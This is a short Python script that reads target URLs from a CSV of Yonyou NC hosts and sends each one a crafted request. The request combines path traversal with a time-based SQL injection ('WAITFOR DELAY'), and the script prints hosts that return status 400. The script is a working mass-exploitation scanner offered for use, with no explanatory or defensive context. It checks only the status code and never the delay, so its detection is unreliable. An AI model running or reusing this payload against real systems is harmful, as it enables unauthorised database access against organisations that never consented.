from SpiderMan import *
path="/root/zichan/用友NC.csv"
urls=data_deal(path)
payload='/w_selfservice/oauthservlet/%2e./.%2e/common/org/loadtree?params=child&treetype=1&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&kind=2&issuperuser=1&manageprive=1&action=1&target=1&backdate=1&jump=1'
for i in urls:
    try:
        response=requests.get(i+payload,headers=headers,timeout=5)
        if response.status_code==400:
            print(i,response.status_code)
        else:
            continue
    except:
        continue
